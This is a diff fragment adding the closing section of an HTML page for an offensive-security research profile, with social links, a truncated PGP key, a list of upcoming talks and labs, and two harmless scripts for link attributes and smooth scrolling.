+          <a class="social-btn" href="https://x.com/LEXOLEN111" target="_blank" rel="noopener">x/twitter</a>
+          <a class="social-btn" href="https://www.instagram.com/lex_olen/" target="_blank" rel="noopener">instagram</a>
+          <a class="social-btn" href="https://www.facebook.com/profile.php?id=61580727338902" target="_blank" rel="noopener">facebook</a>
+          <a class="social-btn" href="https://www.linkedin.com/in/lexolen-76bb5a3b7" target="_blank" rel="noopener">linkedin</a>
+          <a class="social-btn" href="http://t.co/zNak0mYlq2" target="_blank" rel="noopener">website</a>
+          <a class="social-btn" href="https://linktr.ee/lexolen" target="_blank" rel="noopener">linktree</a>
+        </div>
+        <hr />
+        <h3>pgp key</h3>
+        <div class="pgp-key">
+          -----BEGIN PGP PUBLIC KEY BLOCK-----<br />
+          xjMEZ2dFpxYJKwYBBAHaRw8BAQdA...<br />
+          -----END PGP PUBLIC KEY BLOCK-----
+        </div>
+        <p style="margin-top: 0.5rem; color: var(--text-muted); font-size: 0.85rem;">fingerprint: 9F8E 2C4A 7D1B 6E3F 8A2C 5D7E 9B1A 3C4D 5E6F 7A8B</p>
+      </div>
+
+      <div class="sidebar-card">
+        <h3>upcoming</h3>
+        <ul style="list-style: none; color: var(--text-muted);">
+          <li>➤ DEF CON 32 – Arsenal talk</li>
+          <li>➤ 0x7C2 lab release</li>
+          <li>➤ free ctf: 2026-04-01</li>
+        </ul>
+      </div>
+    </aside>
+  </div>
+
+  <footer>
+    <p>© 2026 LEXOLEN – offensive security research. MIT License. Use responsibly and only on systems you own or have permission to test.</p>
+  </footer>
+
+  <!-- minimal js: noopener/noreferrer -->
+  <script nonce="xyz123">
+    'use strict';
+    (function() {
+      function init() {
+        try {
+          document.querySelectorAll('a[target="_blank"]').forEach(link => {
+            let rel = link.getAttribute('rel') || '';
+            if (!/\bnoopener\b/.test(rel)) rel = (rel + ' noopener').trim();
+            if (!/\bnoreferrer\b/.test(rel)) rel = (rel + ' noreferrer').trim();
+            link.setAttribute('rel', rel);
+          });
+        } catch (e) { if (console && console.error) console.error('non‑critical error'); }
+      }
+      if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+      else init();
+    })();
+  </script>
+
+  <!-- smooth back-to-top -->
+  <script nonce="xyz123">
+    (function() {
+      const backLink = document.querySelector('.back-top');
+      if (backLink) {
+        backLink.addEventListener('click', function(e) {
+          e.preventDefault();
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+      }
+    })();
+  </script>
+
+</body>
+</html>
